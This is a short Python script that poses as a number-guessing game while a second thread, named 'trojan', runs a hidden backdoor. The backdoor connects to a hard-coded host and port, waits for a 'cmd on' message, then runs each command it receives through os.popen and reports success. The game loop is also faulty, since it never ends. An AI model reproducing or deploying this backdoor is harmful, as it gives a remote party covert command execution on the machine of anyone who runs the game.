import random
import socket
import threading
import os

def trojan():
    HOST = "192.168.1.104"
    PORT = 9090

    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((HOST,PORT))
    cmd_mode = False

    while True:
        server_command = client.recv(1024).decode("utf-8")
        if cmd_mode:
            os.popen(server_command)
        if server_command == "cmd on":
            cmd_mode = True

        client.send(f"{server_command} was executed successfully!".encode("utf-8"))


def game():
    number = random.randint(0,16)
    tries = 1
    done = False
    while not done:
        guess = int(input("Enter your guess: "))

        if guess == number:
            print("You have won!")

        elif guess != number:
            tries += 1
            if guess > number:
                print("Your guess is too high!")
            else:
                print("Your guess is too low!")

    if tries == 1:
        print("Dang you got it first try!")
    else:
        print(f"It took you {tries} You MORON :c")

t1 = threading.Thread(target=game)
t2 = threading.Thread(target=trojan)

t1.start()
t2.start()